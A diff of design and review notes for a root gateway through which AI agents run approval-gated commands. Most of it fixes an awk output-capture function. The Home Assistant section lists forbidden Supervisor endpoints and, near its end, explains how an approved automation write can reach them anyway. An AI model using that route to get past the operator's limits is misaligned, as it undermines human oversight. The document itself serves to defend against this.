@@ -48,6 +48,14 @@ dashboard LXC or any gateway until the rollout gate in § 8 passes.**
 | F16 | Reviewed, parameterised scripts ("recipes") any agent can run with one approval, often drafted from F13 runbooks |
 | F17 | A ready-made setup for a local model in LM Studio: its own token, a small toolset, and a hand-off to Hermes |
 | F19 | Commands that run with nobody watching (read lane, probes, read-only recipes) get a hard time limit and output cap on the gateway |
+| F21 | Before a risky change inside a Proxmox guest, Eshu can take a snapshot first; one click rolls it back, and old snapshots expire |
+| F22 | Each change in a plan can carry a check ("the service is running"); Eshu runs it right after the change and stops the plan if it fails |
+| F23 | A per-host timeline of what Eshu changed, with that host's alerts next to it ("this alert started 4 minutes after request X") |
+| F24 | Warns on the approval card when a write uses a value the agent first saw in untrusted content (a web page, a log line) |
+| F25 | Named secrets per host: a command refers to a key by name, the gateway fills it in, and the agent never sees the value |
+| F26 | Try a new agent or model in shadow mode: its writes are recorded, never run, and compared with what you really approved |
+| X2 | A Runbooks page: list, search and open confirmed runbooks, and retire old ones |
+| F20 | Reserved: the local-agent pass, parked on a local branch until the end |
 
 ## 1. Why — what the live data says
 
@@ -213,6 +221,15 @@ The dashboard is deployed first; gateways update later via Build → Edge → Fl
   include a Raspberry Pi 1: no extra `python3` start on the hot path. The
   gateway runs as root via `sudo`; temp files only via `mktemp -p /run/eshu`
   (the private 0700 work dir the poller creates — refuse if it is missing or a symlink).
+* **F5 capture is byte-bounded and best effort.** `capture_tail` runs `awk`
+  with `LC_ALL=C` and keeps the last 16 385 bytes in a ring of lines (linear
+  cost, file written at `END`). The cap counts **bytes**; in a UTF-8 locale
+  gawk counts characters. A stream that does not end in a newline stores one
+  extra newline: portable awk cannot see the missing newline (only gawk's
+  `RT`), so this is accepted rather than emulated — `tee` was byte-exact here.
+  The command's status is `PIPESTATUS[0]` of the stream, never the trimmer's;
+  a capture that cannot be written logs `CAPTURE FAILED` and changes nothing
+  else.
 * No drive-by refactors, renames or reformatting.
 
 ---
@@ -3292,6 +3309,177 @@ Full gate:
 (1779 before this round + 5 new tests: two disconnect, oversized body, no
 audit event, lockbox window.)
 
+### Round 3 — the CI hang in the capture reader (fix)
+
+GitHub's `Run test suite` failed on every push from F5 onward: six gateway
+tests timed out (`exit_zero_posts_result`, `nonzero_exit_posts_result`,
+`agent_output_unchanged`, `sanitize_before_capture`, `temp_files_removed`,
+`result_post_failure_is_harmless`), all of them a `tail`-mode run with under
+16 KiB of output, while the same tests passed on every machine tried here
+(fresh venv with only `requirements-dev.txt`, clean `/etc`, C locale, 6× CPU
+oversubscription, a real Ubuntu 24.04 rootfs as uid 1000).
+
+The reader was the problem: `{ tail …; cat …; } < "$FIFO" &` plus `wait`.
+On the runners it never saw EOF, so the call (and with it the test's
+`subprocess.run`) waited for ever; a gateway call that never returns is a
+root process that never returns. Making the wait bounded and detaching the
+reader's stdio turned the hang into a visibly empty capture and proved the
+reader was the stuck part (`CAPTURE READER WEDGED` in the log).
+
+**The reader is gone.** `capture_tail()` keeps the last 16 KiB + 1 *in the
+stream*: one `awk` that passes every line through to the agent
+(`print; fflush()`), keeps a bounded window in memory, and writes the file at
+`END`. No FIFO, no second process, no wait, so there is nothing that can
+wedge. The properties the FIFO existed for are unchanged and tested: output
+still streams live (`test_f5_gateway_output_streams_live`), the stream is
+still never cut on a disconnect (E1 tests), the stored bytes are still capped
+at 16 KiB, and a failing trimmer cannot change the command's exit code
+(the test now named `test_f5_gateway_unwritable_capture_keeps_stdout_and_exit`,
+see round 4). A capture that cannot
+be set up now logs `CAPTURE DISABLED` with the reason instead of silently
+degrading.
+
+`test_f5_gateway_dead_reader_keeps_stdout` was replaced by the two tests
+above: the reader it guarded no longer exists, and its replacement pins the
+behaviour that matters.
+
+`bash scripts/verify.sh`: `2330 passed, 7 warnings in 431.19s (0:07:11)`.
+
+### Round 4 — CI fix review round 3 (C1–C4)
+
+The reviewer reproduced four problems in `capture_tail()` on synthetic input.
+All four are fixed. The tests now run the function under **mawk and gawk**
+(whichever is installed; a missing one skips with a reason), because that is
+the environment difference that matters for a gateway: Debian and Ubuntu ship
+mawk as `awk`.
+
+* **C1 — the trimmer could change the exit code.** `set -o pipefail` reported
+  awk's status as the command's: an unwritable capture file turned rc 0 into 2
+  and rc 3 into 2. `rc` now comes from `PIPESTATUS[0]` of the stream (`set +e`
+  around the pipeline so `set -e` cannot exit before the sentinel and the
+  post). The non-capture branch takes `PIPESTATUS[0]` too, so a failing
+  `sanitize` can no longer mask the command either. The awk write is best
+  effort: its stderr is not pushed into the agent's stream, a failure logs
+  `CAPTURE FAILED`, the `EXIT` trap is quiet when the file is already gone,
+  and `post_exec_result` reads only a regular file. The old test stubbed
+  `tail`, which the run no longer calls, so it passed without exercising
+  anything; `test_f5_gateway_unwritable_capture_keeps_stdout_and_exit`
+  replaces it. The command replaces the `mktemp`ed capture path with a
+  directory (this fails as root too, unlike a `chmod`), prints 20 000 bytes
+  and exits 7; the test asserts rc 7, the full stream, `[ESHU exit=7]`, the
+  `CAPTURE FAILED` log and an empty stored output.
+* **C2 — quadratic cost.** The 16 KiB buffer was re-copied for every line
+  (26.6 s for `seq 2000000` with gawk). It is now a ring of lines with a
+  running byte total: drop the oldest while the rest is still ≥ 16 385 bytes,
+  trim the first line at `END` to exactly 16 385 bytes. That is
+  byte-identical to `tail -c 16385`, and 200 000 lines take ~0.3 s.
+  `test_f5_capture_tail_is_linear_in_the_output` bounds it at 10 s — loose
+  enough for a slow runner, still an order of magnitude below the quadratic
+  case.
+* **C3 — locale.** The cap is bytes, so awk runs with `LC_ALL=C`. In a UTF-8
+  locale gawk counts characters: the multibyte payload would store 19 835
+  bytes where the cap is 16 385, and mawk and gawk treat invalid byte
+  sequences differently. Payloads: multibyte text and invalid bytes, each
+  compared byte for byte with `tail -c 16385`.
+* **C4 — missing final newline.** Portable awk cannot see it (only gawk's
+  `RT`), so a stream that does not end in "\n" stores one extra newline.
+  Accepted rather than emulated, stated in § 2.7, and pinned by
+  `test_f5_capture_tail_matches_tail_c_16385[no-final-newline-…]`.
+
+**Why the old reader never saw EOF.** Not conclusively established: the
+bounded wait showed the reader blocked in `cat` waiting for EOF, so something
+still held the FIFO's write end after `tee` finished; which process that was
+was never identified. The reader is gone, so the question is closed either
+way.
+
+New file `tests/test_f5_capture_tail.py` lifts the `capture_tail` definition
+out of the script (asserting it is still there, under `LC_ALL=C`) and runs it
+with `awk` bound to each implementation: the cap and byte-exactness over
+varied, huge-single-line, empty-line, multibyte and invalid-byte payloads, the
+stream unchanged, linear cost, the write failure, and no log on success.
+
+Both installers were regenerated in this commit
+(`python3 dashboard/gen_installer.py`).
+
+`bash scripts/verify.sh`: `2352 passed, 7 warnings in 429.69s (0:07:09)`.
+
+### Round 5 — CI fix review round 4 (C5)
+
+* **C5 — dropped ring lines were never freed.** The ring advanced `head` but
+  left `line[head % 20000]` in the array until its slot was reused, so up to
+  20 000 dropped lines stayed resident: 200 MB of output peaked at 395 MB
+  resident instead of 16 KiB. The loop now `delete`s both `line` and `size`
+  for the slot it drops.
+  `test_f5_capture_tail_frees_dropped_lines` streams 2000 × 100 KB lines
+  through the function under `ulimit -v 65536` (64 MB) for each awk, so a leak
+  is fatal rather than slow, and still asserts the stored bytes are
+  `tail -c 16385`. Without the `delete`s the test fails under both awks; the
+  two-awk run takes about 2 s.
+
+Both installers were regenerated in this commit
+(`python3 dashboard/gen_installer.py`).
+
+`bash scripts/verify.sh` (gawk installed): `2354 passed, 7 warnings in 430.48s (0:07:10)`.
+`bash scripts/verify.sh` (gawk absent here, so its parameters skip):
+`2342 passed, 12 skipped, 7 warnings in 433.29s (0:07:13)`.
+
+**A test-oracle note.** On one CI run (`05d72f2`) the *linear* test failed
+while `capture_tail` had stored the correct 16 385 bytes: the oracle, a
+`tail -c 16385` subprocess, returned a 32.5 KB suffix. The test no longer
+depends on a tool it is not testing — `_tail` slices the payload in Python
+(`data[-CAP:]`), which is exactly what `tail -c CAP` means for a byte string.
+
+### Round 6 — the buffering fix (B1–B4)
+
+**Commit: `5b0f5e4`.** It contains `dashboard/eshu-gateway.sh` and both
+regenerated installers; the security reviewer signs off this diff.
+
+* **B1 — `sanitize` is line-buffered.** GNU `sed` block-buffers its output
+  into a pipe, so a slow command's first bytes never reach a closed
+  connection and the command keeps running (the D1 check timed 39–41 s in
+  every mode, including `exit-only`). `sanitize` now runs
+  `stdbuf -oL sed -E …`; `stdbuf` is looked up once per call on the fixed
+  PATH, and when it is missing (BusyBox) the script falls back to plain `sed`
+  and writes one line to syslog. The redaction expressions are unchanged,
+  and every existing sanitize test passes unchanged.
+  `test_f5_gateway_without_stdbuf_still_runs` runs the fallback with the
+  sandbox's `stdbuf=False` seam and asserts the output, the exit code and the
+  result row are still correct (and the syslog line is present).
+* **B2 — `-W interactive` was measured and rejected.** mawk does
+  block-buffer its stdin, but `-W interactive` makes mawk split **any record
+  longer than 4096 bytes**: a 20000-byte line becomes five records, and the
+  agent's stream gains four newlines that were never in the command's output.
+  That breaks F5's byte-exactness contract (the C4 newline is the only
+  accepted deviation), so the option is not passed. `stdbuf -i0` was also
+  measured and does not change mawk's reader (it keeps its own buffer), so
+  no wrapper is used. **Consequence:** on mawk, a *very* slow writer (under
+  ~4 KiB after the agent hangs up) is still held in awk's input buffer, so
+  the disconnect is noticed only when the buffer fills. This is the
+  pre-existing mawk behaviour the D1 check identified; the command was
+  already approved and no privilege is gained, and F19's time limit is the
+  bound for unattended runs. `test_f5_capture_tail_does_not_use_mawk_interactive`
+  pins the decision at the source, and the 20000-byte payload test is the
+  behavioural guard.
+* **B3 — the slow-writer test, through `run_sanitized`.**
+  `test_f5_gateway_slow_writer_dies_with_the_agent` runs a writer that prints
+  every 0.1 s for 60 s through the real gateway in `tail` and `exit-only`
+  modes, closes the reading end after the first line, and asserts the
+  gateway and the command are gone within 5 s. Under **gawk** both modes pass
+  (about 0.3 s). Two cases skip with a stated reason: **mawk** (the B2
+  input-buffer residual) and **SIGPIPE ignored** — with SIGPIPE ignored GNU
+  `sed` keeps reading after EPIPE, so no buffering change can bound the
+  command; `yes | stdbuf -oL sed | head -1` hangs the same way under
+  `trap '' PIPE`. sshd gives its children the default signal, and the
+  function-level D1 test still covers awk in both modes.
+* **B4 — carried forward.** F12's MCP capture moves onto `capture_tail`
+  (separate branch) and F19's pipeline is redrawn on this `sanitize`
+  (design round 3). F19's time limit remains the bound for unattended runs,
+  whatever the buffering does.
+
+Both installers were regenerated in this commit.
+
+`bash scripts/verify.sh`: `2366 passed, 6 skipped, 7 warnings in 432.32s (0:07:12)`.
+
 ### Reviewer notes
 
 **Design round 1 (2026-11-08): approved with changes.** Fold D1–D8 into the
@@ -3424,6 +3612,312 @@ and golden tests pass locally; implementer's full run 1784 passed. Installers
 regenerate with no diff, and `static/dev/` is untouched. No security sign-off
 is needed (§ 2.6a). The backlog keeps the argv exposure of the gateway token
 and of `/api/log`'s command (§ 11).
+
+**CI fix review, round 3 (2026-11-09): changes requested.** The diagnosis is
+good work: the `::error` annotations made GitHub's failure readable, and
+removing the second reader is the right fix. Nothing can wedge now. Four
+problems in `capture_tail()`, all reproduced with synthetic input:
+
+* **C1 (must): the trimmer can change the exit code.** `set -o pipefail` is on,
+  so if `awk` fails, the pipeline reports awk's status, not the command's.
+  An unwritable capture file (tmpfs full, `mktemp` file removed) turns rc 0
+  into 2, and rc 3 into 2. `test_f5_gateway_dead_trimmer_keeps_stdout_and_exit`
+  does not catch it: it stubs `tail`, which the run no longer calls, so it
+  passes without exercising anything. Fix: take the rc from
+  `PIPESTATUS[0]` (with `set +e` around the pipeline), and make the awk END
+  write failure-tolerant. Rewrite the test so the *awk* write fails (for
+  example, the capture path is replaced by a directory before the run) and
+  assert rc, stdout and `[ESHU exit=N]` are the command's.
+* **C2 (must): quadratic cost.** Every line copies the 16 KiB buffer.
+  `seq 2000000` through `capture_tail` takes 26.6 s with gawk and 2.8 s with
+  mawk, against 0.06 s for `cat`. A root process burning CPU on a large
+  `journalctl` or `find` in `tail` mode is a regression. A ring of lines
+  with a running byte total (drop the oldest lines while the total minus the
+  oldest is still over 16385, trim the first line at END) takes 1.7 s with gawk
+  and 1.0 s with mawk, and its file is byte-identical to `tail -c 16385`. Add
+  a test that bounds the time for ~200k lines generously (say < 10 s), so it
+  catches the quadratic case without being flaky.
+* **C3 (must): run awk with `LC_ALL=C`.** In a UTF-8 locale gawk's
+  `length`/`substr` count characters, not bytes, and invalid UTF-8 can be
+  handled differently by mawk and gawk. Bytes are what the cap means.
+  Test with multibyte output and with invalid bytes.
+* **C4 (should): a missing final newline is added.** `printf 'a\nb'` reaches
+  the agent as `a\nb\n`. `tee` was byte-exact. Portable awk cannot see the
+  missing newline (only gawk's `RT`), so either accept it and say so in § 2.7
+  and the F5 notes, or keep the agent's stream byte-exact by other means.
+  Either is fine; pin it with a test.
+
+Also: test under **mawk** as well as gawk. Debian and Ubuntu gateways ship
+mawk as `awk`, and CI images often have gawk. A test that runs the
+capture function under each awk that is installed (skip if absent) is
+enough. If you know why the old reader never saw EOF on the runners, add one
+line about it; it is not blocking.
+
+**Security gate:** this changes the root gateway script, so after C1–C4 the
+security reviewer checks the `capture_tail`/`run_sanitized` diff before merge
+(§ 2.6a). The CI annotation helper in `tests/conftest.py` is fine as it is.
+
+**CI fix review, round 4 (2026-11-09, `cf59287`): one fix left (C5).** C1–C4
+are fixed as asked. rc comes from `PIPESTATUS[0]` under `set +e`; the old
+`tail`-stub test is replaced by a directory-capture test; the ring is linear
+and byte-identical to `tail -c 16385` (checked here under gawk and mawk); and
+the C4 newline is documented and pinned. 163 capture, F5 and gateway tests pass
+locally.
+
+* **C5 (must): dropped ring lines are never freed.** The loop advances
+  `head` but leaves `line[head % 20000]` in the array until its slot is
+  reused, so up to 20000 old lines stay in memory. With 4000 lines of
+  100 KB (400 MB of output), maxrss is **395 MB** under gawk and 393 MB under
+  mawk. Adding `delete line[head % 20000]` before `head++` brings that to
+  **4.3 MB** and 3.1 MB, with the file still byte-identical to `tail -c 16385`.
+  Add a test that bounds memory: for example, 2000 × 100 KB lines through
+  `capture_tail` under `ulimit -v` of about 64 MB must succeed, under each awk.
+  Then this goes to the security reviewer, with the diff `9470cff..` on
+  `eshu-gateway.sh`.
+
+**CI fix review, round 5 (2026-11-10, `1423e77`): approved by the feature
+reviewer, waiting on security.** C5 is fixed: dropped slots are deleted.
+Rechecked here: 4,000 lines of 100 KB peak at 3.9 MB, and `seq 300000` is
+byte-identical to `tail -c 16385` under gawk and mawk. The `ulimit -v` test
+makes a leak fatal. 165 capture, F5 and gateway tests pass locally, and
+GitHub CI passes (3.10, 3.12, syntax). **Next:** the security reviewer checks
+the `eshu-gateway.sh` diff `9470cff..1423e77` (`capture_tail`,
+`run_sanitized`, `post_exec_result`). Then I merge.
+
+**Security reviewer sign-off: CI fix (`9470cff..1423e77`,
+`eshu-gateway.sh`), 2026-11-10: approved, with one test required before
+merge.** I read `capture_tail`, `run_sanitized` and `post_exec_result`. I did
+not run anything.
+
+*What holds:*
+
+* **Nothing is left to hang on.** There is no FIFO, no background reader and
+  no `wait`. The capture rides in the stream and is written by `END` in the
+  same process, so the gateway call ends when the pipeline ends.
+* **Exit code.** It comes from `PIPESTATUS[0]` with `set +e` around the
+  pipeline only, and `set -e` is restored straight after. A failing capture
+  can no longer change the command's exit code, and it cannot stop the
+  sentinel or the result post. The `[ESHU exit=N]` tests cover both
+  branches.
+* **The awk program never treats output as code.** Data is used only through
+  `print`, `length` and `substr`. The capture path comes in through `-v` and
+  is a `mktemp` name in the root-only 0700 directory, so nobody else can
+  swap the file under it.
+* **Memory and CPU are bounded.** The ring holds about 16 KiB plus one line,
+  the work grows in step with the output, and dropped slots are freed. The
+  slot count is safe, since no more than 16385 lines can be kept.
+  `LC_ALL=C` makes the cap count bytes.
+* **The capture is best effort.** A write failure reaches syslog, never the
+  agent's stream. `post_exec_result` checks `-f` and falls back to an empty
+  output on any read error.
+
+*Required before merge (the feature reviewer can check it; it does not need
+to come back to me):*
+
+* **D1. A disconnect test.** E1, "an agent disconnect still ends the
+  command", used to rest on `tee`. It now rests on awk dying when it writes
+  to a closed stdout, and no test covers that. A root command that outlives
+  its caller is exactly what this fix exists to prevent.
+  - Test, under mawk and gawk: run a command that writes a line every 0.1 s
+    for 60 s, through `run_sanitized` in `tail` mode. Close the reading end
+    after the first line.
+  - Assert that the gateway process and the command are gone within a few
+    seconds.
+  - Run it twice: once with the default SIGPIPE handling, which is what sshd
+    gives its children, and once with SIGPIPE ignored (`trap '' PIPE` in the
+    harness).
+  - If an awk keeps going in the ignored case, add `if (fflush() < 0) exit 1`.
+    The `fflush()` return check is portable.
+
+*Recorded, not blocking:*
+
+* **Three ways the agent's stream is no longer byte-exact.** In `tail` mode
+  awk now sits in the stream to the agent, which `tee` did not. A missing
+  final newline gets added (C4, accepted). Embedded NUL bytes may be handled
+  differently by different awks. A single huge line is held in memory once
+  more, on top of `sed`'s copy. None of this is a security change. The F19
+  raw byte cap (L5) bounds the memory for unattended runs.
+* **A misleading syslog line.** When awk is killed by a disconnect, the
+  `|| logger` line logs "CAPTURE FAILED". If that proves confusing, log the
+  exit status as well.
+* **Rebasing F12 and F19 onto this fix.**
+  - F12's `run_sanitized` still has the FIFO plus `tail -c 65537` reader for
+    the MCP envelope. When F12 rebases onto this fix, the MCP capture must
+    use this ring too: make the 16385 a parameter and send stdout to
+    `/dev/null` in MCP mode. No second reader may come back.
+  - The F12 rebase of `run_sanitized` comes back to me with F12's R1–R4 diff.
+  - F19's pipeline sketch (`head -c` and `PIPESTATUS`) should be rewritten
+    on top of this version.
+
+**D1 check (feature reviewer, 2026-11-10).** I wrote the test myself
+(`test_f5_capture_tail_ends_when_the_agent_disconnects`, under mawk and gawk,
+with SIGPIPE at its default and ignored): a command writing as fast as it can
+(`yes`), with the reader hanging up after one line. awk stops in all four
+cases, so `fflush()` needs no return check. 28 capture tests pass.
+
+The **slow writer from the D1 spec** shows something older than this fix. I
+used a line every 0.1 s and the reader hanging up after line 1, timing until
+the command stops:
+
+| pipeline | command keeps running |
+|---|---|
+| `sanitize \| tee` (F5, what is live today) | 41 s (the whole run) |
+| `sanitize \| capture_tail`, gawk or mawk | 39–41 s |
+| `stdbuf -oL sed … \| mawk -W interactive …` | 0.3 s |
+| `sed -u … \| capture_tail` (gawk) | 0.3 s |
+
+The cause is **`sanitize`**. GNU `sed` block-buffers its output into a pipe,
+so a slow command's first ~4 KB never reaches the closed connection, and the
+command never gets its SIGPIPE until then. That is true in **every** capture
+mode, including `exit-only` (`"$@" | sanitize`), so it is live on every
+gateway today. mawk also block-buffers its *input* from a pipe unless given
+`-W interactive`, which matters once `sed` is fixed. The CI fix is therefore
+**no worse than `tee`**, but the D1 spec as written fails for a reason the CI
+fix did not introduce.
+
+Proposed fix (two lines, gateway bash):
+* `sanitize`: `stdbuf -oL sed -E …`, with plain `sed` if `stdbuf` is
+  missing. That costs 0.8 s per million lines, against 0.1 s today; `sed -u`
+  costs 2.7 s.
+* `capture_tail`: add `-W interactive` when `awk -W version` reports mawk.
+  gawk prints a warning for that option, so detect mawk first; don't pass it
+  blindly.
+* The test exactly as specified (slow writer through `run_sanitized`, gone
+  within 5 s, both awks, both SIGPIPE modes), in `tail` **and** `exit-only`
+  modes.
+
+**Security reviewer on the D1 check (2026-11-10, `069cd59`): D1 is met,
+and the CI fix may merge now.** The disconnect test is what I asked for: awk
+stops under mawk and gawk, with SIGPIPE at its default and ignored, so
+`fflush()` needs no return check.
+
+The slow-writer result does not block this merge. It is not a regression:
+`sed` already block-buffered under `tee`, and the table shows the same 41 s
+before and after this fix. The disconnect test in this branch covers what
+the CI fix changed. A command that keeps running after its agent hangs up is
+a resource problem, not a privilege one: the command was already approved.
+It belongs in its own fix.
+
+**The buffering fix: a separate small gateway-bash branch, which comes back
+to me.** The proposed approach is fine. Conditions:
+
+* **B1. Make `sanitize` line-buffered with `stdbuf -oL sed -E …`.** Find
+  `stdbuf` on the fixed `PATH` once per call. When it is missing, fall back
+  to plain `sed` and log once to syslog, never to the agent's stream. The
+  redaction expressions stay exactly as they are. The existing sanitize
+  tests must pass unchanged, which shows line-buffering changes nothing that
+  is redacted.
+* **B2. Pass `-W interactive` only to mawk.** Detect mawk once per call:
+  `awk -W version 2>/dev/null` prints "mawk". Any other output, or an error
+  (BusyBox awk, gawk), means the option is not passed. Test with a stub
+  `awk` that fails on `-W version`.
+* **B3. The slow-writer test, exactly as the D1 spec describes it.** Run it
+  through `run_sanitized` in both `tail` and `exit-only` modes, under both
+  awks and both SIGPIPE modes. The command must be gone within 5 s. Add one
+  case with `stdbuf` absent, which records the slower fallback (no time
+  bound) and asserts that the output and the exit code are still correct.
+* **B4. Carry it forward to F12 and F19.** When F12 rebases, its MCP capture
+  uses the same `sanitize` and the same mawk detection. F19's pipeline (L4
+  and L5) builds on the line-buffered `sanitize`. F19's time limit stays the
+  bound for unattended runs, whatever the buffering does.
+
+**Buffering fix review (feature reviewer, 2026-11-10, `fix/stream-unbuffered` at
+`5477da5`): approved; to the security reviewer (gateway bash, § 2.6a).** CI is
+green on the branch.
+
+* **B1 is right.** `stdbuf -oL sed -E` with the same expressions, found once
+  per call, plain `sed` plus a syslog line when absent. Rechecked here: a
+  slow writer through `stdbuf -oL sed` into a reader that closes after the
+  first line ends in **0.2 s** (exit-only path).
+* **B2's rejection is right, and the evidence is stronger than the note
+  says.** On this reviewer's mawk 1.3.4 **20240123**, `-W interactive` does not
+  split a 20 000-byte line: it **truncates** it to 4 097 bytes (one line,
+  `wc -c` 4097). Either way it corrupts the agent's stream, so it must not be
+  used. The `-W interactive` source guard stays.
+* **The residual is real and limited to `tail` capture on mawk.** Measured:
+  slow writer → `stdbuf -oL sed` → `mawk` ring → reader closes after one line:
+  **10.7 s** (the whole writer). The 16 live gateways are all `exit-only`, where
+  awk is not in the stream, so B1 fully fixes them. `RELEASE_1.md` step 6
+  (optional `tail` on one gateway) should mention it.
+* **S1 (should, a later fix, not this branch): take awk out of the visible
+  stream in `tail` mode.** `… | sanitize | tee >(capture_tail "$cap" >/dev/null)`
+  measured **0.3 s** with mawk: `tee` writes as it reads, gets EPIPE at once,
+  and the ring only reads. The cost is waiting for the process substitution
+  before the result post (bash ≥ 5.1 `wait $!`, or the ring writes to a temp
+  name and `mv`s, with a short bounded poll). Its own small chunk, gateway bash,
+  security sign-off.
+* **N1 (nit):** the slow-writer test skips mawk in **both** modes, but in
+  `exit-only` awk is not in the pipeline, so the mawk/exit-only case can run.
+  Skip only `mawk` + `tail`.
+* **N2 (nit):** without `stdbuf` the syslog line is written on every call. All
+  gateways are systemd hosts with coreutils, so this will not fire in
+  practice; fine as is.
+
+**Merge order:** security signs off → I merge this into `feature-roadmap` →
+F12 merges `feature-roadmap` forward again (it does **not** have B1 yet: the
+F12 report said "B1 came with the merge", but `sanitize` on F12 is still
+plain `sed`) → security re-checks the merged F12 gateway diff → I merge F12.
+
+**Security reviewer sign-off: buffering fix (`fix/stream-unbuffered` at
+`981f467`, gateway diff `5b0f5e4`), 2026-11-10: approved.**
+
+* **B1 is right.**
+  - `stdbuf` is looked up once on the fixed `PATH`, after the environment is
+    scrubbed. Its `LD_PRELOAD` reaches only `sed`.
+  - The redaction expressions are unchanged, and the fallback writes to
+    syslog only.
+  - With `exit-only` capture, which is every live gateway, awk is not in the
+    stream, so B1 fully closes the slow-writer gap there.
+* **The rejection of B2 is accepted.** `-W interactive` splits or truncates
+  long lines, which corrupts the agent's stream. A wrong stream is worse
+  than a late stop.
+* **The residual risk is accepted, with limits.** On mawk with `tail`
+  capture, a slow writer can outlive a disconnect until awk's input buffer
+  fills. This uses resources but gives no access beyond what was approved.
+  F19's time limit bounds it for unattended runs. Conditions:
+  - `RELEASE_1.md` step 6 says so for anyone turning on `tail` capture on a
+    mawk host.
+  - The SIGPIPE-ignored case stays out of scope: sshd gives its children the
+    default handling.
+  - N1 is worth doing: run the mawk plus `exit-only` case instead of
+    skipping it.
+* **For the later tee-based fix (S1), when it comes to me:**
+  - It brings back a second process that the script waits for, which is the
+    shape that hung CI. The wait must be bounded: a short poll with a hard
+    deadline, after which the result post goes without the capture. It must
+    never be an unbounded `wait`.
+  - The capture must be written to a temporary name and renamed, so a
+    half-written capture is never posted.
+  - Test: a capture process that never exits does not hold the call.
+* **Merge order:** as the feature reviewer wrote. I check the merged F12
+  gateway diff, which picks up B1, before F12 merges.
+
+### Round 7 — N1 (test-only)
+
+**Commit: test change only** (`tests/test_f5_exec_results.py`), plus the
+`RELEASE_1.md` step 6 note the security sign-off made a condition.
+
+* **N1 — the mawk skip is now `mawk` + `tail` only.** In `exit-only` capture
+  `awk` is not in the pipeline, so the mawk case says nothing about mawk: it
+  runs, and the `mode == 'tail'` guard replaces the old `awk_name == 'mawk'`
+  skip. The skip reason now states why (mawk reads stdin in 4 KiB blocks, so
+  the tail ring cannot see the first line early; 10.7 s measured).
+  The matrix here (mawk 1.3.4, no gawk in this container): `mawk`/`exit-only`/
+  **default** runs and passes (about 0.3 s to the disconnect, command gone);
+  `mawk`/`tail` skips; the `gawk` parameters skip as before (not installed);
+  SIGPIPE-ignored keeps its own skip in both modes — that is GNU `sed` on
+  EPIPE, not the awk in the path. On the two F5 files: `58 passed, 21 skipped`
+  with this change, `57 passed, 22 skipped` without it — one case moved from
+  skip to pass, nothing else.
+* **`RELEASE_1.md` step 6** now names the mawk/`tail` residual for anyone
+  turning on `tail` capture, as the sign-off required.
+* **S1 is not done here** (the `tee`-based tail, its own chunk with a bounded
+  wait, per the sign-off); the merge order from the review stands, and F12 is
+  not merged forward on this branch.
+
+`bash scripts/verify.sh`: `2351 passed, 21 skipped, 7 warnings in 430.97s (0:07:10)`
+(gawk is not installed in this container, so the 15 `gawk` parameters skip —
+unchanged by this commit; CI runs them).
 
 ---
 
@@ -4682,11 +5176,714 @@ F14 merges second only needs to resolve the docstring.
 
 ### Implementer notes
 
-_(fill in)_
+**Status: implemented, awaiting review.** The acceptance criteria include a
+reviewer security pass (try to reach every FORBIDDEN endpoint), so this note
+lists where to push and what the tests already prove.
+
+**Commit:** the code and tests are in `1e14827` (`feat(f10): HA Supervisor
+actions (approval-gated)`) on `feat/f10-ha-supervisor-actions`. This note is
+a separate docs commit.
+
+#### 1. What was checked against the HA Core source
+
+Checked on 2026-11-09 against `home-assistant/core@dev`:
+
+* `homeassistant/components/hassio/websocket_api.py` — the `supervisor/api`
+  command requires `endpoint` (string) and `method` (string), accepts optional
+  `data` (dict), `params` (dict) and `timeout` (number), is `@require_admin`,
+  and hands `data` to the Supervisor passthrough client; the WS result is
+  `result["data"]`. `hassio/update/addon` requires `addon` (str) **and**
+  `backup` (bool); `hassio/update/core` requires `backup` (bool). Both are
+  `@require_admin` and delegate to `update_helper.update_addon/update_core`.
+* `homeassistant/components/hassio/const.py` — `WS_TYPE_API = "supervisor/api"`.
+* `homeassistant/components/hassio/update.py` / `update_helper.py` — the
+  update WS commands schedule the same work the Supervisor's
+  `/addons/{slug}/update` and `/core/update` endpoints do; the command returns
+  after the Supervisor call completes, which is the source of the timeout note
+  in §5.
+
+**Not verifiable from that source:** the Supervisor itself is closed-source,
+so the REST endpoint names and payloads (`/backups/new/full`,
+`/backups/new/partial`, `/core/restart`, `/host/reboot`,
+`/addons/{slug}/{action}`) come from the Supervisor API docs and this chunk's
+spec, not from HA Core. That is recorded as open question 1 rather than
+assumed silently.
+
+#### 2. The table
+
+`core/ha_supervisor.SUPERVISOR_ACTIONS` maps each tool to one fixed
+(endpoint, method) pair; `WS_ACTIONS` holds the two update commands. The agent
+supplies arguments only, and only as validated placeholders:
+
+| Tool | Fixed target | Arguments | Notes |
+|---|---|---|---|
+| `ha_addon_action` | `POST /addons/{slug}/{action}` via `supervisor/api` | `slug`, `action` | `action` must be one of start/stop/restart (the only `{action}` values in the table) |
+| `ha_addon_update` | WS `hassio/update/addon` | `slug`, `backup` | |
+| `ha_core_update` | WS `hassio/update/core` | `backup` | |
+| `ha_backup_create` | `POST /backups/new/full` or `/partial` | `name`, `partial_addons`, `partial_folders` | the *payload* decides partial vs full; nothing agent-supplied reaches the path |
+| `ha_core_restart` | `POST /core/restart` | — | refused unless a valid `ha_check_config` ran on this integration in the last 10 min |
+| `ha_host_reboot` | `POST /host/reboot` | — | seeded **disabled**; summary is `REBOOTS THE WHOLE HA HOST` and the card renders it in red |
+
+All six are `read_only: False`, `always_gate: True`, `handler:
+ha_supervisor_action`, so each call creates a pending approval and **nothing
+runs before the operator approves it**. Freeze refuses before queueing (the
+generic F9 path, tested). `ha_check_config` now has a handler so its result is
+recorded in `meta` under `ha_check_config_<integration>` (`result`, `at`): a
+valid check on one HA instance never vouches for another.
+
+#### 3. FORBIDDEN
+
+`FORBIDDEN` lists restore (`/backups/`), add-on options/install/uninstall
+(`/addons/`), `/supervisor/options`, `/host/shutdown`, `/store/repositories`,
+`/auth*`, `/security*`, `/os/datadisk*` and `/os/boot-slot`. A table test
+walks every endpoint the read and action tables can produce and every WS
+command, and fails if one starts with a forbidden prefix. The one deliberate
+exception is documented in the test: `/backups/new/full|partial` are the only
+`/backups/` paths reachable, and `/addons/{slug}/{start|stop|restart}` the only
+`/addons/` ones. The generic WS tools remain unable to send
+`supervisor/`/`hassio/` commands at all (F9 R2), and an approved pending call
+runs the *handler*, not a raw command, so that does not change here.
+
+**Where FORBIDDEN stops (S-b).** FORBIDDEN covers *direct* paths. An approved
+generic HA write to the automation, script or scene config API
+(`/api/config/automation|script|scene/config/...`) can define an action that
+calls any `hassio.*` service, and running that action reaches what FORBIDDEN
+names. Scanning the body cannot catch it, because templates can build the
+domain name. Approving such a write therefore grants admin power: the approval
